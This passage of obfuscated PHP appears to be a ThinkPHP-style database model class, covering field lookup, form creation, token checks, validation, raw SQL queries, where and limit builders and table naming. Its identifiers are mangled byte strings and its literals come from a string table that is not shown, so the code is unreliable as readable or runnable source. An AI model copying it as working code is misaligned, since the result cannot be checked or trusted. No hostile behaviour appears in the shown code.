setAdd($‘ùİ¼¸£, $úÀû²ÜÄ = 1) { $”ÌÁí“ =& $_SERVER[íû‘ş´]; $Ü¸ı È = $‘ùİ¼¸£ . $”ÌÁí“[340] . $úÀû²ÜÄ; if ($úÀû²ÜÄ < 0) { $Ü¸ı È = $‘ùİ¼¸£ . $úÀû²ÜÄ; } return $this->setField($‘ùİ¼¸£, array($”ÌÁí“[341], $Ü¸ı È)); } public function getField($ßïËšÚ¯, $Ñ˜£Ğ¢ä = null) { $º­›îü =& $_SERVER[íû‘ş´]; $… åöæ¹[$º­›îü[317]] = $ßïËšÚ¯; $… åöæ¹ = $this->_parseOptions($… åöæ¹); $ßïËšÚ¯ = trim($ßïËšÚ¯); if (strpos($ßïËšÚ¯, $º­›îü[50])) { if (!isset($… åöæ¹[$º­›îü[336]])) { $… åöæ¹[$º­›îü[336]] = is_numeric($Ñ˜£Ğ¢ä) ? $Ñ˜£Ğ¢ä : $º­›îü[12]; } $Ûõêéåä = $this->db->select($… åöæ¹); if (!empty($Ûõêéåä)) { $µ’¾ÃÉ = explode($º­›îü[50], $ßïËšÚ¯); $ßïËšÚ¯ = array_keys($Ûõêéåä[0]); $¤€¬æŸİ = array_shift($ßïËšÚ¯); $‹‚éùòĞ = array_shift($ßïËšÚ¯); $ò™‘Ùçí = array(); $×ë½‰¬¿ = count($µ’¾ÃÉ); foreach ($Ûõêéåä as $¶Ô›ªĞ˜) { $œÊ¢ Ì = $¶Ô›ªĞ˜[$¤€¬æŸİ]; if (2 == $×ë½‰¬¿) { $ò™‘Ùçí[$œÊ¢ Ì] = $¶Ô›ªĞ˜[$‹‚éùòĞ]; } else { $ò™‘Ùçí[$œÊ¢ Ì] = is_string($Ñ˜£Ğ¢ä) ? implode($Ñ˜£Ğ¢ä, $¶Ô›ªĞ˜) : $¶Ô›ªĞ˜; } } return $ò™‘Ùçí; } } else { if (!0 !== $Ñ˜£Ğ¢ä) { $… åöæ¹[$º­›îü[336]] = is_numeric($Ñ˜£Ğ¢ä) ? $Ñ˜£Ğ¢ä : 1; } if ($Ñ˜£Ğ¢ä === $º­›îü[299]) { unset($… åöæ¹[$º­›îü[336]]); } $¶Ô›ªĞ˜ = $this->db->select($… åöæ¹); if (!empty($¶Ô›ªĞ˜)) { if ($Ñ˜£Ğ¢ä === $º­›îü[299]) { return reset($¶Ô›ªĞ˜[0]); } if (!0 !== $Ñ˜£Ğ¢ä && 1 == $… åöæ¹[$º­›îü[336]]) { return reset($¶Ô›ªĞ˜[0]); } foreach ($¶Ô›ªĞ˜ as $ô³©Êå÷) { $ÔŒ¹¬²Î[] = $ô³©Êå÷[$ßïËšÚ¯]; } return $ÔŒ¹¬²Î; } } return null; } public function create($ÓÅ˜Ó©× = '', $¥Ş–¬¤È = '') { $ñĞÊ¯² =& $_SERVER[íû‘ş´]; if (empty($ÓÅ˜Ó©×)) { $ÓÅ˜Ó©× = $_POST; } elseif (is_object($ÓÅ˜Ó©×)) { $ÓÅ˜Ó©× = get_object_vars($ÓÅ˜Ó©×); } if (empty($ÓÅ˜Ó©×) || !is_array($ÓÅ˜Ó©×)) { $this->error = think_lang($ñĞÊ¯²[315]); return !1; } $ÓÅ˜Ó©× = $this->parseFieldsMap($ÓÅ˜Ó©×, 0); $¥Ş–¬¤È = $¥Ş–¬¤È ? $¥Ş–¬¤È : (!empty($ÓÅ˜Ó©×[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ñĞÊ¯²[317]])) { $×ïßöÎ = $this->options[$ñĞÊ¯²[317]]; unset($this->options[$ñĞÊ¯²[317]]); } elseif ($¥Ş–¬¤È == THINK_MODEL_INSERT && isset($this->insertFields)) { $×ïßöÎ = $this->insertFields; } elseif ($¥Ş–¬¤È == THINK_MODEL_UPDATE && isset($this->updateFields)) { $×ïßöÎ = $this->updateFields; } if (isset($×ïßöÎ)) { if (is_string($×ïßöÎ)) { $×ïßöÎ = explode($ñĞÊ¯²[50], $×ïßöÎ); } if (think_config($ñĞÊ¯²[342])) { $×ïßöÎ[] = think_config($ñĞÊ¯²[343]); } foreach ($ÓÅ˜Ó©× as $°ùÀÆ½ => $Ò¶†ƒ¨“) { if (!in_array($°ùÀÆ½, $×ïßöÎ)) { unset($ÓÅ˜Ó©×[$°ùÀÆ½]); } } } if (!$this->autoValidation($ÓÅ˜Ó©×, $¥Ş–¬¤È)) { return !1; } if (!$this->autoCheckToken($ÓÅ˜Ó©×)) { $this->error = think_lang($ñĞÊ¯²[344]); return !1; } if ($this->autoCheckFields) { $×ïßöÎ = $this->getDbFields(); foreach ($ÓÅ˜Ó©× as $°ùÀÆ½ => $Ò¶†ƒ¨“) { if (!in_array($°ùÀÆ½, $×ïßöÎ)) { unset($ÓÅ˜Ó©×[$°ùÀÆ½]); } elseif (MAGIC_QUOTES_GPC && is_string($Ò¶†ƒ¨“)) { $ÓÅ˜Ó©×[$°ùÀÆ½] = stripslashes($Ò¶†ƒ¨“); } } } $this->autoOperation($ÓÅ˜Ó©×, $¥Ş–¬¤È); $this->data = $ÓÅ˜Ó©×; return $ÓÅ˜Ó©×; } public function autoCheckToken($ÀÍÕú²ã) { $«½Îí£— =& $_SERVER[íû‘ş´]; if (isset($this->options[$«½Îí£—[345]]) && !$this->options[$«½Îí£—[345]]) { return !0; } if (think_config($«½Îí£—[342])) { $øûâØ¦ = think_config($«½Îí£—[343]); if (!isset($ÀÍÕú²ã[$øûâØ¦]) || Session::get($øûâØ¦)) { return !1; } list($ÇÜª€­, $ã‰ïÀŒ) = explode($«½Îí£—[11], $ÀÍÕú²ã[$øûâØ¦]); if ($ã‰ïÀŒ && Session::get($øûâØ¦ . $«½Îí£—[10] . $ÇÜª€­) === $ã‰ïÀŒ) { Session::remove($øûâØ¦ . $«½Îí£—[10] . $ÇÜª€­); return !0; } if (think_config($«½Îí£—[346])) { Session::remove($øûâØ¦ . $«½Îí£—[10] . $ÇÜª€­); } return !1; } return !0; } public function regex($ıƒ¦ş‹, $¡¨üùÖÛ) { $¿Õ‰¬Ò =& $_SERVER[íû‘ş´]; $’¡œ¼›¤ = array($¿Õ‰¬Ò[347] => $¿Õ‰¬Ò[348], $¿Õ‰¬Ò[349] => $¿Õ‰¬Ò[350], $¿Õ‰¬Ò[351] => $¿Õ‰¬Ò[352], $¿Õ‰¬Ò[353] => $¿Õ‰¬Ò[354], $¿Õ‰¬Ò[355] => $¿Õ‰¬Ò[356], $¿Õ‰¬Ò[357] => $¿Õ‰¬Ò[358], $¿Õ‰¬Ò[359] => $¿Õ‰¬Ò[360], $¿Õ‰¬Ò[334] => $¿Õ‰¬Ò[361], $¿Õ‰¬Ò[362] => $¿Õ‰¬Ò[363]); if (isset($’¡œ¼›¤[strtolower($¡¨üùÖÛ)])) { $¡¨üùÖÛ = $’¡œ¼›¤[strtolower($¡¨üùÖÛ)]; } return preg_match($¡¨üùÖÛ, $ıƒ¦ş‹) === 1; } private function autoOperation(&$‹„³¾É, $¤Å¾™‘ƒ) { $°İ’‹ =& $_SERVER[íû‘ş´]; if (!empty($this->options[$°İ’‹[364]])) { $¨†“Å²ˆ = $this->options[$°İ’‹[364]]; unset($this->options[$°İ’‹[364]]); } elseif (!empty($this->_auto)) { $¨†“Å²ˆ = $this->_auto; } if (isset($¨†“Å²ˆ)) { foreach ($¨†“Å²ˆ as $Ú£ôåù€) { if (empty($Ú£ôåù€[2])) { $Ú£ôåù€[2] = THINK_MODEL_INSERT; } if ($¤Å¾™‘ƒ == $Ú£ôåù€[2] || $Ú£ôåù€[2] == THINK_MODEL_BOTH) { switch (trim($Ú£ôåù€[3])) { case $°İ’‹[365]: case $°İ’‹[366]: $Ö†”—Ã = isset($Ú£ôåù€[4]) ? (array) $Ú£ôåù€[4] : array(); if (isset($‹„³¾É[$Ú£ôåù€[0]])) { array_unshift($Ö†”—Ã, $‹„³¾É[$Ú£ôåù€[0]]); } if ($°İ’‹[365] == $Ú£ôåù€[3]) { $‹„³¾É[$Ú£ôåù€[0]] = call_user_func_array($Ú£ôåù€[1], $Ö†”—Ã); } else { $‹„³¾É[$Ú£ôåù€[0]] = call_user_func_array(array(&$this, $Ú£ôåù€[1]), $Ö†”—Ã); } break; case $°İ’‹[317]: $‹„³¾É[$Ú£ôåù€[0]] = $‹„³¾É[$Ú£ôåù€[1]]; break; case $°İ’‹[367]: if ($°İ’‹[12] === $‹„³¾É[$Ú£ôåù€[0]]) { unset($‹„³¾É[$Ú£ôåù€[0]]); } break; case $°İ’‹[368]: default: $‹„³¾É[$Ú£ôåù€[0]] = $Ú£ôåù€[1]; } if (!1 === $‹„³¾É[$Ú£ôåù€[0]]) { unset($‹„³¾É[$Ú£ôåù€[0]]); } } } } return $‹„³¾É; } protected function autoValidation($œ¢ª¢®, $ß«ÊÖìç) { $„êŠÀÚ™ =& $_SERVER[íû‘ş´]; if (!empty($this->options[$„êŠÀÚ™[369]])) { $ú¡äàÅ÷ = $this->options[$„êŠÀÚ™[369]]; unset($this->options[$„êŠÀÚ™[369]]); } elseif (!empty($this->_validate)) { $ú¡äàÅ÷ = $this->_validate; } if (isset($ú¡äàÅ÷)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ú¡äàÅ÷ as $Æ–×İ¯ => $¾ìı†œß) { if (empty($¾ìı†œß[5]) || $¾ìı†œß[5] == THINK_MODEL_BOTH || $¾ìı†œß[5] == $ß«ÊÖìç) { if (0 == strpos($¾ìı†œß[2], $„êŠÀÚ™[370]) && strpos($¾ìı†œß[2], $„êŠÀÚ™[371])) { $¾ìı†œß[2] = think_lang(substr($¾ìı†œß[2], 2, -1)); } $¾ìı†œß[3] = isset($¾ìı†œß[3]) ? $¾ìı†œß[3] : THINK_EXISTS_VALIDATE; $¾ìı†œß[4] = isset($¾ìı†œß[4]) ? $¾ìı†œß[4] : $„êŠÀÚ™[372]; switch ($¾ìı†œß[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($œ¢ª¢®, $¾ìı†œß)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($„êŠÀÚ™[12] != trim($œ¢ª¢®[$¾ìı†œß[0]])) { if (!1 === $this->_validationField($œ¢ª¢®, $¾ìı†œß)) { return !1; } } break; default: if (isset($œ¢ª¢®[$¾ìı†œß[0]])) { if (!1 === $this->_validationField($œ¢ª¢®, $¾ìı†œß)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ ÜáôæŠ, $Ü¯ïé´Ş) { if (!1 === $this->_validationFieldItem($ ÜáôæŠ, $Ü¯ïé´Ş)) { if ($this->patchValidate) { $this->error[$Ü¯ïé´Ş[0]] = $Ü¯ïé´Ş[2]; } else { $this->error = $Ü¯ïé´Ş[2]; return !1; } } return; } protected function _validationFieldItem($š•Ï“î, $ˆÆù‹Èª) { $Ï‹ªØí• =& $_SERVER[íû‘ş´]; switch (strtolower(trim($ˆÆù‹Èª[4]))) { case $Ï‹ªØí•[365]: case $Ï‹ªØí•[366]: $œ‚î‰€ = isset($ˆÆù‹Èª[6]) ? (array) $ˆÆù‹Èª[6] : array(); if (is_string($ˆÆù‹Èª[0]) && strpos($ˆÆù‹Èª[0], $Ï‹ªØí•[50])) { $ˆÆù‹Èª[0] = explode($Ï‹ªØí•[50], $ˆÆù‹Èª[0]); } if (is_array($ˆÆù‹Èª[0])) { foreach ($ˆÆù‹Èª[0] as $µä¾ëÁº) { $æ¤¾šÌˆ[$µä¾ëÁº] = $š•Ï“î[$µä¾ëÁº]; } array_unshift($œ‚î‰€, $æ¤¾šÌˆ); } else { array_unshift($œ‚î‰€, $š•Ï“î[$ˆÆù‹Èª[0]]); } if ($Ï‹ªØí•[365] == $ˆÆù‹Èª[4]) { return call_user_func_array($ˆÆù‹Èª[1], $œ‚î‰€); } else { return call_user_func_array(array(&$this, $ˆÆù‹Èª[1]), $œ‚î‰€); } case $Ï‹ªØí•[373]: return $š•Ï“î[$ˆÆù‹Èª[0]] == $š•Ï“î[$ˆÆù‹Èª[1]]; case $Ï‹ªØí•[374]: if (is_string($ˆÆù‹Èª[0]) && strpos($ˆÆù‹Èª[0], $Ï‹ªØí•[50])) { $ˆÆù‹Èª[0] = explode($Ï‹ªØí•[50], $ˆÆù‹Èª[0]); } $ƒ†Ë˜ù = array(); if (is_array($ˆÆù‹Èª[0])) { foreach ($ˆÆù‹Èª[0] as $µä¾ëÁº) { $ƒ†Ë˜ù[$µä¾ëÁº] = $š•Ï“î[$µä¾ëÁº]; } } else { $ƒ†Ë˜ù[$ˆÆù‹Èª[0]] = $š•Ï“î[$ˆÆù‹Èª[0]]; } if (!empty($š•Ï“î[$this->getPk()])) { $ƒ†Ë˜ù[$this->getPk()] = array($Ï‹ªØí•[375], $š•Ï“î[$this->getPk()]); } if ($this->where($ƒ†Ë˜ù)->find()) { return !1; } return !0; default: return $this->check($š•Ï“î[$ˆÆù‹Èª[0]], $ˆÆù‹Èª[1], $ˆÆù‹Èª[4]); } } public function check($ºá¦èÌ, $à½­èŞõ, $Ôç˜ú = "\x72\x65\x67\145\x78") { $É”ô©ª¤ =& $_SERVER[íû‘ş´]; $Ôç˜ú = strtolower(trim($Ôç˜ú)); switch ($Ôç˜ú) { case $É”ô©ª¤[7]: case $É”ô©ª¤[376]: $ƒà¬ÍÓĞ = is_array($à½­èŞõ) ? $à½­èŞõ : explode($É”ô©ª¤[50], $à½­èŞõ); return $Ôç˜ú == $É”ô©ª¤[7] ? in_array($ºá¦èÌ, $ƒà¬ÍÓĞ) : !in_array($ºá¦èÌ, $ƒà¬ÍÓĞ); case $É”ô©ª¤[377]: case $É”ô©ª¤[378]: if (is_array($à½­èŞõ)) { $‹ã°İÙò = $à½­èŞõ[0]; $÷÷°ñú = $à½­èŞõ[1]; } else { list($‹ã°İÙò, $÷÷°ñú) = explode($É”ô©ª¤[50], $à½­èŞõ); } return $Ôç˜ú == $É”ô©ª¤[377] ? $ºá¦èÌ >= $‹ã°İÙò && $ºá¦èÌ <= $÷÷°ñú : $ºá¦èÌ < $‹ã°İÙò || $ºá¦èÌ > $÷÷°ñú; case $É”ô©ª¤[379]: case $É”ô©ª¤[380]: return $Ôç˜ú == $É”ô©ª¤[379] ? $ºá¦èÌ == $à½­èŞõ : $ºá¦èÌ != $à½­èŞõ; case $É”ô©ª¤[381]: $ŞÅ”ÖœË = mb_strlen($ºá¦èÌ, $É”ô©ª¤[382]); if (strpos($à½­èŞõ, $É”ô©ª¤[50])) { list($‹ã°İÙò, $÷÷°ñú) = explode($É”ô©ª¤[50], $à½­èŞõ); return $ŞÅ”ÖœË >= $‹ã°İÙò && $ŞÅ”ÖœË <= $÷÷°ñú; } else { return $ŞÅ”ÖœË == $à½­èŞõ; } case $É”ô©ª¤[383]: list($ñ©¼ƒŠ, $„–³¹šı) = explode($É”ô©ª¤[50], $à½­èŞõ); if (!is_numeric($ñ©¼ƒŠ)) { $ñ©¼ƒŠ = strtotime($ñ©¼ƒŠ); } if (!is_numeric($„–³¹šı)) { $„–³¹šı = strtotime($„–³¹šı); } return NOW_TIME >= $ñ©¼ƒŠ && NOW_TIME <= $„–³¹šı; case $É”ô©ª¤[384]: return in_array(get_client_ip(), explode($É”ô©ª¤[50], $à½­èŞõ)); case $É”ô©ª¤[385]: return !in_array(get_client_ip(), explode($É”ô©ª¤[50], $à½­èŞõ)); case $É”ô©ª¤[372]: default: return $this->regex($ºá¦èÌ, $à½­èŞõ); } } public function query($ñ¦û„È´, $êœÎÌä = false) { $Ş®”™Õ =& $_SERVER[íû‘ş´]; if (!is_bool($êœÎÌä) && !is_array($êœÎÌä)) { $êœÎÌä = func_get_args(); array_shift($êœÎÌä); } $ñ¦û„È´ = str_replace(array($Ş®”™Õ[246], $Ş®”™Õ[386]), $Ş®”™Õ[53], $ñ¦û„È´); $ñ¦û„È´ = $this->parseSql($ñ¦û„È´, $êœÎÌä); return $this->db->query($ñ¦û„È´); } public function execute($¥à…ñ—, $ıŠŒ¢ÉÇ = false) { if (!is_bool($ıŠŒ¢ÉÇ) && !is_array($ıŠŒ¢ÉÇ)) { $ıŠŒ¢ÉÇ = func_get_args(); array_shift($ıŠŒ¢ÉÇ); } $¥à…ñ— = $this->parseSql($¥à…ñ—, $ıŠŒ¢ÉÇ); return $this->db->execute($¥à…ñ—); } protected function parseSql($µõƒĞùì, $Ñ³“½Ã¥) { $¯êëĞç­ =& $_SERVER[íû‘ş´]; if (!0 === $Ñ³“½Ã¥) { $Êüê†òĞ = $this->_parseOptions(); $µõƒĞùì = $this->db->parseSql($µõƒĞùì, $Êüê†òĞ); } elseif (is_array($Ñ³“½Ã¥)) { $Ñ³“½Ã¥ = array_map(array($this->db, $¯êëĞç­[387]), $Ñ³“½Ã¥); $µõƒĞùì = vsprintf($µõƒĞùì, $Ñ³“½Ã¥); } else { $µõƒĞùì = strtr($µõƒĞùì, array($¯êëĞç­[388] => $this->getTableName(), $¯êëĞç­[389] => think_config($¯êëĞç­[288]))); } $this->db->setModel($this->name); return $µõƒĞùì; } public function db($à÷šä»ç = '', $Í’—ÅÑŞ = '', $„è•Âß¯ = array()) { $â„Ù¥Œ¤ =& $_SERVER[íû‘ş´]; if ($â„Ù¥Œ¤[12] === $à÷šä»ç && $this->db) { return $this->db; } static $ŸÔÁ»¥  = array(); static $¶ÁÄæ = array(); if (!isset($¶ÁÄæ[$à÷šä»ç]) || isset($¶ÁÄæ[$à÷šä»ç]) && $Í’—ÅÑŞ && $ŸÔÁ»¥ [$à÷šä»ç] != $Í’—ÅÑŞ) { if (!empty($Í’—ÅÑŞ) && is_string($Í’—ÅÑŞ) && !1 === strpos($Í’—ÅÑŞ, $â„Ù¥Œ¤[8])) { $Í’—ÅÑŞ = think_config($Í’—ÅÑŞ); } $à÷šä»ç = think_guid($Í’—ÅÑŞ); $¶ÁÄæ[$à÷šä»ç] = Db::getInstance($Í’—ÅÑŞ); } elseif (NULL === $Í’—ÅÑŞ) { $¶ÁÄæ[$à÷šä»ç]->close(); unset($¶ÁÄæ[$à÷šä»ç]); return; } if (!empty($„è•Âß¯)) { if (is_string($„è•Âß¯)) { parse_str($„è•Âß¯, $„è•Âß¯); } foreach ($„è•Âß¯ as $••›Şè => $ĞäÁ¤şˆ) { $this->setProperty($••›Şè, $ĞäÁ¤şˆ); } } $ŸÔÁ»¥ [$à÷šä»ç] = $Í’—ÅÑŞ; $this->db = $¶ÁÄæ[$à÷šä»ç]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $á…Ñ¬ìë = get_class($this); if ($á…Ñ¬ìë == $_SERVER[íû‘ş´][390]) { return $this->name; } $this->name = substr($á…Ñ¬ìë, 0, -5); } return $this->name; } public function getTableName() { $ë«ÉãŸÙ =& $_SERVER[íû‘ş´]; if (empty($this->trueTableName)) { $Ú‚«˜‡€ = !empty($this->tablePrefix) ? $this->tablePrefix : $ë«ÉãŸÙ[12]; if (!empty($this->tableName)) { $Ú‚«˜‡€ .= $this->tableName; } else { $Ú‚«˜‡€ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ú‚«˜‡€); } return (!empty($this->dbName) ? $this->dbName . $ë«ÉãŸÙ[10] : $ë«ÉãŸÙ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ğ»åã…ë =& $_SERVER[íû‘ş´]; return isset($this->fields[$Ğ»åã…ë[295]]) ? $this->fields[$Ğ»åã…ë[295]] : $this->pk; } public function getDbFields() { $Ù¡ééù– =& $_SERVER[íû‘ş´]; if (isset($this->options[$Ù¡ééù–[323]])) { $õ®½·Í = $this->db->getFields($this->options[$Ù¡ééù–[323]]); return $õ®½·Í ? array_keys($õ®½·Í) : !1; } if ($this->fields) { $õ®½·Í = $this->fields; unset($õ®½·Í[$Ù¡ééù–[294]], $õ®½·Í[$Ù¡ééù–[295]], $õ®½·Í[$Ù¡ééù–[296]], $õ®½·Í[$Ù¡ééù–[293]]); return $õ®½·Í; } return !1; } public function data($ÓéÍ³‰ = '') { $ĞĞ½šóÉ =& $_SERVER[íû‘ş´]; if ($ĞĞ½šóÉ[12] === $ÓéÍ³‰ && !empty($this->data)) { return $this->data; } if (is_object($ÓéÍ³‰)) { $ÓéÍ³‰ = get_object_vars($ÓéÍ³‰); } elseif (is_string($ÓéÍ³‰)) { parse_str($ÓéÍ³‰, $ÓéÍ³‰); } elseif (!is_array($ÓéÍ³‰)) { think_exception(think_lang($ĞĞ½šóÉ[315])); } $this->data = $ÓéÍ³‰; return $this; } public function join($æ­æ‚Öñ) { $´ˆ¨î¯ =& $_SERVER[íû‘ş´]; if (is_array($æ­æ‚Öñ)) { $this->options[$´ˆ¨î¯[326]] = $æ­æ‚Öñ; } elseif (!empty($æ­æ‚Öñ)) { $this->options[$´ˆ¨î¯[326]][] = $æ­æ‚Öñ; } return $this; } public function union($´›¸áíò, $‹ ¥¿ı = false) { $‘»ƒª¼ê =& $_SERVER[íû‘ş´]; if (empty($´›¸áíò)) { return $this; } if ($‹ ¥¿ı) { $this->options[$‘»ƒª¼ê[391]][$‘»ƒª¼ê[392]] = !0; } if (is_object($´›¸áíò)) { $´›¸áíò = get_object_vars($´›¸áíò); } if (is_string($´›¸áíò)) { $±ğÈ²ä½ = $´›¸áíò; } elseif (is_array($´›¸áíò)) { if (isset($´›¸áíò[0])) { $this->options[$‘»ƒª¼ê[391]] = array_merge($this->options[$‘»ƒª¼ê[391]], $´›¸áíò); return $this; } else { $±ğÈ²ä½ = $´›¸áíò; } } else { think_exception(think_lang($‘»ƒª¼ê[315])); } $this->options[$‘»ƒª¼ê[391]][] = $±ğÈ²ä½; return $this; } public function cache($æëÁı¤¿ = true, $íØ®ç´ = null, $´†°™ = '') { $Ì¢¶Üá =& $_SERVER[íû‘ş´]; if (!1 !== $æëÁı¤¿) { $this->options[$Ì¢¶Üá[393]] = array($Ì¢¶Üá[94] => $æëÁı¤¿, $Ì¢¶Üá[383] => $íØ®ç´, $Ì¢¶Üá[33] => $´†°™); } return $this; } public function field($ê³†Ş½€, $´–‘›Ú = false) { $èšÆ ô¢ =& $_SERVER[íû‘ş´]; if (!0 === $ê³†Ş½€) { $âØİÔµà = $this->getDbFields(); $ê³†Ş½€ = $âØİÔµà ? $âØİÔµà : $èšÆ ô¢[203]; } elseif ($´–‘›Ú) { if (is_string($ê³†Ş½€)) { $ê³†Ş½€ = explode($èšÆ ô¢[50], $ê³†Ş½€); } $âØİÔµà = $this->getDbFields(); $ê³†Ş½€ = $âØİÔµà ? array_diff($âØİÔµà, $ê³†Ş½€) : $ê³†Ş½€; } $this->options[$èšÆ ô¢[317]] = $ê³†Ş½€; return $this; } public function scope($À¶Ã = '', $‡ûÃÀ´ê = NULL) { $ŠÑ¶çØÍ =& $_SERVER[íû‘ş´]; if ($ŠÑ¶çØÍ[12] === $À¶Ã) { if (isset($this->_scope[$ŠÑ¶çØÍ[37]])) { $Èı¹›‰— = $this->_scope[$ŠÑ¶çØÍ[37]]; } else { return $this; } } elseif (is_string($À¶Ã)) { $şîÖ·àå = explode($ŠÑ¶çØÍ[50], $À¶Ã); $Èı¹›‰— = array(); foreach ($şîÖ·àå as $Ù½ººÜ) { if (!isset($this->_scope[$Ù½ººÜ])) { continue; } $Èı¹›‰— = array_merge($Èı¹›‰—, $this->_scope[$Ù½ººÜ]); } if (!empty($‡ûÃÀ´ê) && is_array($‡ûÃÀ´ê)) { $Èı¹›‰— = array_merge($Èı¹›‰—, $‡ûÃÀ´ê); } } elseif (is_array($À¶Ã)) { $Èı¹›‰— = $À¶Ã; } if (is_array($Èı¹›‰—) && !empty($Èı¹›‰—)) { $this->options = array_merge($this->options, array_change_key_case($Èı¹›‰—)); } return $this; } public function where($¶‘éö‰, $ĞÁÄº¢ = null) { $ú˜ëú˜ì =& $_SERVER[íû‘ş´]; if (!is_null($ĞÁÄº¢) && is_string($¶‘éö‰)) { if (!is_array($ĞÁÄº¢)) { $ĞÁÄº¢ = func_get_args(); array_shift($ĞÁÄº¢); } $ĞÁÄº¢ = array_map(array($this->db, $ú˜ëú˜ì[387]), $ĞÁÄº¢); $¶‘éö‰ = vsprintf($¶‘éö‰, $ĞÁÄº¢); } elseif (is_object($¶‘éö‰)) { $¶‘éö‰ = get_object_vars($¶‘éö‰); } elseif (is_array($¶‘éö‰)) { foreach ($¶‘éö‰ as $›æÎ¼¢· => $ŒˆİèÒé) { if ((is_numeric($›æÎ¼¢·) || !$›æÎ¼¢·) && is_string($ŒˆİèÒé)) { if (strpos($ŒˆİèÒé, $ú˜ëú˜ì[394]) === 0) { continue; } think_trace($ú˜ëú˜ì[395], $ú˜ëú˜ì[12], $ú˜ëú˜ì[49]); die; } } } if (is_string($¶‘éö‰) && $ú˜ëú˜ì[12] != $¶‘éö‰) { $À­Æ³Ù‘ = array(); $À­Æ³Ù‘[$ú˜ëú˜ì[396]] = $¶‘éö‰; $¶‘éö‰ = $À­Æ³Ù‘; } if (isset($this->options[$ú˜ëú˜ì[319]])) { $this->options[$ú˜ëú˜ì[319]] = array_merge($this->options[$ú˜ëú˜ì[319]], $¶‘éö‰); } else { $this->options[$ú˜ëú˜ì[319]] = $¶‘éö‰; } return $this; } public function limit($î÷™ÈğÖ, $ß‹®ñî² = null) { $Åó™óó’ =& $_SERVER[íû‘ş´]; $this->options[$Åó™óó’[336]] = is_null($ß‹®ñî²) ? $î÷™ÈğÖ : $î÷™ÈğÖ . $Åó™óó’[50] . $ß‹®ñî²; return $this; } public function page($ä’º¸Ë—, $åÕÖÈã = null) { $ııÍ„Í† =& $_SERVER[íû‘ş´]; $this->options[$ııÍ„Í†[397]] = is_null($åÕÖÈã) ? $ä’º¸Ë— : $ä’º¸Ë— . $ııÍ„Í†[50] . $åÕÖÈã; return $this; } public function comment($İ£ ˜¹) { $this->options[$_SERVER[íû‘ş´][398]] = $İ£ ˜¹; return $this; } public function setProperty($ãñ’”¼², $ÃÎÚ¹ªí) { if (property_exists($this, $ãñ’”¼²)) { $this->{$ãñ’”¼²} = $ÃÎÚ¹ªí; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\x54\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\x73\145\x72\164\x2c\x75\160\144\141\x74\145", "\x66\x75\156\143\x74\151\157\x6e"), array("\x63\162\x65\141\x74\x65\x54\x69\155\145", "\x74\x69\155\x65", "\x69\156\x73\x65\x72\164", "\146\165\156\x63\164\x69\x6f\x6e")); public function setDataAuto($œ®Áš“ğ) { $this->dataAuto = $œ®Áš“ğ; } public function __construct($åö°è± = '', $‹ƒ“î¥ = '', $‹Ûø¦Ã’ = '') { parent::__construct($åö°è±, $‹ƒ“î¥, $‹Ûø¦Ã’); } protected $tableMeta = array(); protected function _beforeInsert(&$£œö¯À, $šñÖûôÉ) { $Òª¡’¯ø =& $_SERVER[íû‘ş´]; if (!$this->checkDataAutoHas($Òª¡’¯ø[399])) { return; } $this->dataBeforeFilter($£œö¯À, $Òª¡’¯ø[399]); } protected function _beforeUpdate(&$È¾Ï¿Ç‹, $ç»ŒŞİ€) { $Ô€ˆÅ¬¯ =& $_SERVER[íû‘ş´]; if (!$this->checkDataAutoHas($Ô€ˆÅ¬¯[400])) { return; } $this->dataBeforeFilter($È¾Ï¿Ç‹, $Ô€ˆÅ¬¯[400]); } protected function _afterSelect(&$µïôàş, $Œ–¾àÕí) { if (!is_array($µïôàş)) { return; } if (!$this->checkDataAutoHas($_SERVER[íû‘ş´][401])) { return; } foreach ($µïôàş as &$Ç¾ğúæ¥) { $this->dataAfterFilter($Ç¾ğúæ¥); } unset($Ç¾ğúæ¥); } protected function _afterFind(&$÷ùÙå«», $æ¼§¬Ö¢) { if (!is_array($÷ùÙå«»)) { return; } if (!$this->checkDataAutoHas($_SERVER[íû‘ş´][401])) { return; } $this->dataAfterFilter($÷ùÙå«»); } public static function textEncode($‡ÎÎÏå) { if (!$‡ÎÎÏå) { return $‡ÎÎÏå; } $ÊÏ‹ƒô“ = json_encode($‡ÎÎÏå); $ÊÏ‹ƒô“ = preg_replace_callback($_SERVER[íû‘ş´][402], function ($İÃ’„È) { return addslashes($İÃ’„È[0]); }, $ÊÏ‹ƒô“); return json_decode($ÊÏ‹ƒô“); } public static function textDecode($¨•Âìüå) { $åáèç—À =& $_SERVER[íû‘ş´]; $·ñÓ÷ƒŠ = json_encode($¨•Âìüå); $·ñÓ÷ƒŠ = preg_replace_callback($åáèç—À[403], function ($²¤¡“Õ) { return $_SERVER[íû‘ş´][97]; }, $·ñÓ÷ƒŠ); return json_decode($·ñÓ÷ƒŠ); } public function setAutoIncrement($„¦Ë‡) { $ÕŒºş¨ä = array($this->getPk() => $„¦Ë‡); $‚¿ëµ§ = $this->data($ÕŒºş¨ä)->add(); if ($‚¿ëµ§) { $this->delete($‚¿ëµ§); } } public function getAutoIncrement() { $¹Æş‚ = $this->getTableName(); $â­ŠÄÆÍ = $this->max($this->getPk()); $¹–Ú«Ã = $this->query("\163\x68\x6f\x77\x20\x74\x61\142\154\145\40\x73\164\x61\x74\165\163\x20\167\x68\145\162\x65\40\116\141\155\145\x3d\47{$¹Æş‚}\x27"); $É•‰Ê¤ = $¹–Ú«Ã[0][$_SERVER[íû‘ş´][404]]; $»ñÀ¼â¸ = max($â­ŠÄÆÍ, 